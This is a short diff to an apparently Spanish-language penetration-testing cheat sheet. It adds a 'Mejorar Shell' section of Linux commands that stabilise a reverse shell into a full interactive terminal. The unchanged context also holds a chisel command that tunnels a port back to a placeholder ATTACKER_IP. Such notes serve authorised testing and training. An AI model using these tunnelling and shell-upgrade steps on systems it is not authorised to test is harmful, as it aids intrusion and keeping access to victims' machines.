@@ -29,4 +29,18 @@ Cliente
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
 
+## Mejorar Shell
+
+Linux
+```
+script /dev/null -c bash
+(ctrl+z)
+stty raw -echo ;fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+
+
 
